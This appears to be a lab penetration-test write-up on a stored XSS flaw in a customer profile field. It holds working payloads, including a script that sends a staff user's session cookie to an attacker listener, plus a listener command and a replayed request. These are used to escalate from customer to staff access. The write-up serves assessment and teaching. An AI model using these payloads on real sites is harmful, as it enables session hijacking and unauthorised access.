# Task 12: Stored XSS Hijacking

**Vulnerability:** Stored Cross-Site Scripting (CWE-79)

**Endpoints:** `GET /home/profile/update`, `GET /admin/customers`

---

## Steps

The customer **Full Name** field on **My Account** is stored and later rendered as live markup in views other users see. We first confirm it stores by saving a canary as the name:

```html
<b>CANARY-STORED</b>
```

<img width="735" height="537" alt="image" src="https://github.com/user-attachments/assets/d29fcddc-525a-4812-aea9-08991f996015" />

Next we confirm that the field is a true XSS sink, meaning that it actually is executed and not just store with a test payload that pops an alert showing the page origin:

```html
<img src=x onerror=alert(document.domain)>
```

<img width="761" height="417" alt="image" src="https://github.com/user-attachments/assets/d4978ee5-6888-4b84-b951-57f39bdb14e9" />

Loading the account renders the stored markup and fires the alert, showing `192.168.77.80`. So our input is being executed as a script:

<img width="830" height="727" alt="image" src="https://github.com/user-attachments/assets/9e619cc0-a7bc-4056-8dc6-7e4dd6e356fc" />

With execution confirmed, we swap the test payload for a weaponized one. The staff **Customers** directory (`/admin/customers`) renders the name raw (`{!! !!}`) and is viewed by a privileged session, so we set the name to a cookie-stealing beacon aimed at our Kali listener. Single quotes are avoided so the value survives the single-quoted SQL string on the way in:

```html
<script>new Image().src="http://192.168.77.2:8888/?"+document.cookie</script>
```

We start a listener on the Kali box:

```bash
python3 -m http.server 8888
```

When a staff user opens the **Customers** directory, the stored script runs in their browser and beacons their `electra_session` cookie back to us. The request arrives from the staff host `192.168.77.2`:

<img width="1111" height="159" alt="image" src="https://github.com/user-attachments/assets/ad57a582-4089-46e4-a58b-e6bb376bd844" />

We replay the stolen cookie in Burp Repeater against the staff-only directory:

```bash
GET /admin/customers HTTP/1.1
Host: 192.168.77.80
Cookie: electra_session=<captured staff value>
```

The server returns `200 OK` with the full customer directory. From a customer-level account, we are now acting as staff with no staff password:

<img width="2198" height="1218" alt="image" src="https://github.com/user-attachments/assets/f8b4c682-bb85-4201-9cbc-7b89a8c7bb93" />

The same request with a plain customer cookie is redirected to the login page, confirming the endpoint is protected and that the stolen staff session is what grants access:

<img width="2198" height="1218" alt="image" src="https://github.com/user-attachments/assets/6b748c04-d8e9-4df2-8f1c-3cf90da23aef" />

## What this reveals to an attacker

A customer-controlled profile field executes JavaScript in a staff browser, and because
`electra_session` is not flagged `HttpOnly`, that script reads and exfiltrates the staff
session cookie. Replaying it grants full staff access with no staff password, escalating
privilege from any customer account. The same stored value is harmless where it is escaped
and dangerous where it is rendered raw, so output escaping must be applied at every render,
not only where the input originates.

## Remediation

See [remediation](../remediation.md)
